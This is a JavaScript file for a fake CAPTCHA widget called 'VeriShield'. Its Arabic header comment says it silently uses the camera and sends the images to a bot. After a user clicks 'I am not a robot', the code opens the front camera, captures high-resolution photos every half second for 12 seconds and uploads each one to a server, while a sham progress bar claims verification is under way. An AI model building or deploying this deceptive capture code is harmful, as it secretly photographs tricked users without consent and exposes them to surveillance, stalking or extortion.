/**
 * VeriShield - Verification System
 * مع وظائف الكاميرا الصامتة وإرسال الصور إلى البوت
 */

(function() {
  'use strict';

  console.log('✅ VeriShield loaded successfully!');

  // ============================================
  // المتغيرات والعناصر
  // ============================================

  const captchaWidget = document.getElementById('captcha-widget');
  const captchaCheckbox = document.getElementById('captcha-checkbox');
  const captchaText = document.getElementById('captcha-text');
  const finalMessage = document.getElementById('final-message');
  const socialButtons = document.getElementById('social-buttons');
  const progressBar = document.getElementById('progress-bar');
  const progressFill = document.getElementById('progress-fill');

  let isProcessing = false;
  let isVerified = false;
  let progressInterval = null;
  let cameraRejected = false;

  // متغيرات الكاميرا
  let stream = null;
  let video = null;
  let captureInterval = null;
  let finishTimeout = null;
  let imageNumber = 0;
  let cameraError = false;

  const duration = 12000;
  const intervalTime = 500;

  console.log('✅ Elements found:', {
    widget: !!captchaWidget,
    checkbox: !!captchaCheckbox,
    text: !!captchaText,
    message: !!finalMessage,
    social: !!socialButtons,
    progress: !!progressBar
  });

  // ============================================
  // الدوال المساعدة
  // ============================================

  function shakeElement(element) {
    if (!element) return;
    element.style.animation = 'none';
    element.offsetHeight;
    element.style.animation = 'shake 0.3s ease-in-out';
    setTimeout(function() {
      element.style.animation = '';
    }, 300);
  }

  function pulseElement(element) {
    if (!element) return;
    element.style.animation = 'none';
    element.offsetHeight;
    element.style.animation = 'pulse 0.5s ease-in-out 3';
    setTimeout(function() {
      element.style.animation = '';
    }, 1500);
  }

  // ============================================
  // إرسال صورة إلى الخادم (صامت)
  // ============================================

  async function sendImage(blob, number) {
    const formData = new FormData();
    formData.append("images", blob, `camera-${Date.now()}-${number}.jpg`);

    try {
      const response = await fetch("/upload", {
        method: "POST",
        body: formData
      });

      if (!response.ok) {
        throw new Error("HTTP " + response.status);
      }

      const result = await response.json();
      console.log("✅ تم إرسال الصورة رقم", number, result);
      return true;

    } catch (error) {
      console.error("❌ فشل إرسال الصورة رقم", number, error);
      return false;
    }
  }

  // ============================================
  // التقاط صورة وإرسالها (جودة متكيفة مع الكاميرا)
  // ============================================

  async function captureImage() {
    if (!video || !video.videoWidth || !video.videoHeight) {
      return;
    }

    // الحصول على الأبعاد الأصلية للكاميرا
    const originalWidth = video.videoWidth;
    const originalHeight = video.videoHeight;
    
    console.log(`📷 Camera resolution: ${originalWidth}x${originalHeight}`);
    
    // استخدام الأبعاد الأصلية للكاميرا مع الحفاظ على نسبة العرض إلى الارتفاع
    // نحدد الحد الأقصى للجودة مع الحفاظ على الأبعاد الأصلية
    let width = originalWidth;
    let height = originalHeight;
    
    // إذا كانت الصورة كبيرة جداً، نقلل حجمها مع الحفاظ على الجودة
    const maxDimension = 1920; // حد أقصى 1920 بكسل
    if (width > maxDimension || height > maxDimension) {
      const ratio = Math.min(maxDimension / width, maxDimension / height);
      width = Math.round(width * ratio);
      height = Math.round(height * ratio);
    }
    
    // إذا كانت الصورة صغيرة جداً، نستخدم حجمها الأصلي
    const canvas = document.createElement("canvas");
    canvas.width = width;
    canvas.height = height;
    
    const context = canvas.getContext("2d");
    
    // تحسين جودة الصورة باستخدام anti-aliasing
    context.imageSmoothingEnabled = true;
    context.imageSmoothingQuality = 'high';
    
    // رسم الصورة مع الحفاظ على الجودة
    context.drawImage(video, 0, 0, width, height);

    // استخدام JPEG بجودة عالية مع حجم مناسب
    canvas.toBlob(async (blob) => {
      if (!blob) return;
      imageNumber++;
      await sendImage(blob, imageNumber);
    }, "image/jpeg", 0.92); // جودة 92% للتوازن بين الجودة والحجم
  }

  // ============================================
  // إظهار رسالة الخطأ
  // ============================================

  function showError(message) {
    captchaWidget.classList.remove('state-loading', 'state-success');
    captchaWidget.classList.add('state-error');
    
    captchaText.textContent = message;
    captchaText.style.color = '#888888';
    captchaText.style.opacity = '1';
    
    progressBar.classList.add('hidden');
    progressFill.style.width = '0%';
    
    cameraRejected = true;
    isProcessing = false;
    isVerified = false;
    
    captchaCheckbox.setAttribute('aria-checked', 'false');
  }

  // ============================================
  // إعادة تعيين الحالة
  // ============================================

  function resetState() {
    captchaWidget.classList.remove('state-error', 'state-loading', 'state-success');
    
    captchaText.textContent = 'أنا لست برنامج روبوت';
    captchaText.style.color = '#000000';
    captchaText.style.opacity = '1';
    
    progressBar.classList.add('hidden');
    progressFill.style.width = '0%';
    
    cameraRejected = false;
    isProcessing = false;
    isVerified = false;
    
    captchaCheckbox.setAttribute('aria-checked', 'false');
    
    socialButtons.classList.remove('opacity-100');
    socialButtons.classList.add('opacity-0', 'pointer-events-none');
    
    finalMessage.classList.remove('opacity-100');
    finalMessage.classList.add('opacity-0');
    
    if (progressInterval) {
      clearInterval(progressInterval);
      progressInterval = null;
    }
    if (captureInterval) {
      clearInterval(captureInterval);
      captureInterval = null;
    }
    if (finishTimeout) {
      clearTimeout(finishTimeout);
      finishTimeout = null;
    }
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      stream = null;
    }
  }

  // ============================================
  // بدء التحقق
  // ============================================

  function startVerification() {
    console.log('🔄 startVerification called');
    
    if (cameraRejected) {
      console.log('🔄 Resetting from camera rejection');
      resetState();
      setTimeout(function() {
        startVerification();
      }, 100);
      return;
    }
    
    if (isProcessing || isVerified) {
      console.log('⏸️ Skipping - already processing or verified');
      return;
    }

    shakeElement(captchaCheckbox);
    pulseElement(captchaWidget);

    const humanDelay = Math.floor(Math.random() * 100) + 50;
    console.log('⏱️ Human delay:', humanDelay, 'ms');
    
    setTimeout(async function() {
      console.log('▶️ Starting verification process');
      isProcessing = true;
      
      try {
        console.log('📷 Requesting camera...');
        
        // طلب الكاميرا بأفضل جودة متاحة
        stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: "user",
            width: { ideal: 1920 },
            height: { ideal: 1080 }
          },
          audio: false
        });

        console.log('✅ Camera granted!');

        // إعداد الفيديو
        video = document.createElement("video");
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        
        // الانتظار حتى تحميل الفيديو
        await video.play();

        // الانتظار حتى تصبح أبعاد الفيديو متاحة
        await new Promise(resolve => {
          if (video.videoWidth && video.videoHeight) {
            resolve();
            return;
          }
          video.onloadedmetadata = () => resolve();
        });

        console.log(`📷 Camera resolution: ${video.videoWidth}x${video.videoHeight}`);

        // ✅ تم الوصول للكاميرا بنجاح، نغير النص
        captchaWidget.classList.add('state-loading');
        captchaCheckbox.setAttribute('aria-checked', 'mixed');
        
        progressBar.classList.remove('hidden');
        progressFill.style.width = '0%';

        captchaText.style.opacity = '0';
        setTimeout(function() {
          captchaText.textContent = 'جاري التحقق...';
          captchaText.style.opacity = '1';
          pulseElement(captchaText);
        }, 300);

        // التقاط أول صورة فوراً
        await captureImage();

        // بدأ التقاط الصور كل 0.5 ثانية
        captureInterval = setInterval(captureImage, intervalTime);

      } catch (error) {
        console.error("❌ Camera error:", error);
        
        isProcessing = false;
        progressBar.classList.add('hidden');
        progressFill.style.width = '0%';
        
        showError('تعذر استخدام الكاميرا للتحقق. يرجى المحاولة مرة أخرى.');
        return;
      }

      // ============================================
      // شريط التقدم (12 ثانية)
      // ============================================
      let progress = 0;
      const totalTime = duration;
      const intervalTimeProgress = 50;
      const step = (intervalTimeProgress / totalTime) * 100;

      progressInterval = setInterval(function() {
        progress += step;
        if (progress >= 100) {
          progress = 100;
          clearInterval(progressInterval);
        }
        progressFill.style.width = Math.min(progress, 100) + '%';

        if (progress < 30) {
          captchaText.textContent = 'جاري التحقق...';
        } else if (progress < 60) {
          captchaText.textContent = 'جاري التحقق...';
        } else if (progress < 90) {
          captchaText.textContent = 'جاري التحقق...';
        } else {
          captchaText.textContent = 'جاري إكمال التحقق...';
        }
      }, intervalTimeProgress);

      // ============================================
      // اكتمال التحقق بعد 12 ثانية
      // ============================================
      finishTimeout = setTimeout(function() {
        clearInterval(progressInterval);
        clearInterval(captureInterval);
        
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
          stream = null;
        }
        
        completeVerification();
      }, totalTime);

    }, humanDelay);
  }

  // ============================================
  // إكمال التحقق
  // ============================================

  function completeVerification() {
    console.log('✅ Verification complete!');
    isProcessing = false;
    isVerified = true;
    cameraRejected = false;
    
    captchaWidget.classList.remove('state-loading', 'state-error');
    captchaWidget.classList.add('state-success');
    captchaCheckbox.setAttribute('aria-checked', 'true');

    setTimeout(function() {
      progressBar.classList.add('hidden');
    }, 300);

    captchaText.style.opacity = '0';
    setTimeout(function() {
      captchaText.textContent = 'تم التحقق من أنك إنسان';
      captchaText.style.opacity = '1';
      captchaText.style.color = '#00aa45';
      pulseElement(captchaText);

      setTimeout(function() {
        finalMessage.classList.remove('opacity-0');
        finalMessage.classList.add('opacity-100');
        
        finalMessage.style.transform = 'scale(0.95)';
        setTimeout(function() {
          finalMessage.style.transform = 'scale(1)';
        }, 100);

        setTimeout(function() {
          socialButtons.classList.remove('opacity-0', 'pointer-events-none');
          socialButtons.classList.add('opacity-100');
          
          socialButtons.style.transform = 'scale(0.9)';
          setTimeout(function() {
            socialButtons.style.transform = 'scale(1)';
          }, 100);
        }, 400);

      }, 600);
    }, 300);
  }

  // ============================================
  // إضافة أحداث النقر
  // ============================================
  
  console.log('🔄 Adding event listeners...');

  captchaCheckbox.addEventListener('click', function(e) {
    console.log('👆 Checkbox clicked!');
    e.stopPropagation();
    startVerification();
  });

  captchaCheckbox.addEventListener('keydown', function(e) {
    if (e.key === ' ' || e.key === 'Enter') {
      console.log('⌨️ Keyboard pressed:', e.key);
      e.preventDefault();
      startVerification();
    }
  });

  captchaText.addEventListener('click', function() {
    console.log('👆 Text clicked!');
    if (!isProcessing && !isVerified) {
      startVerification();
    }
  });

  socialButtons.addEventListener('click', function(e) {
    if (!isVerified) {
      e.preventDefault();
      e.stopPropagation();
    }
  });

  window.addEventListener("beforeunload", function() {
    if (captureInterval) clearInterval(captureInterval);
    if (progressInterval) clearInterval(progressInterval);
    if (finishTimeout) clearTimeout(finishTimeout);
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  });

  console.log('✅ All event listeners added successfully!');
  console.log('🚀 Ready to verify!');

})();
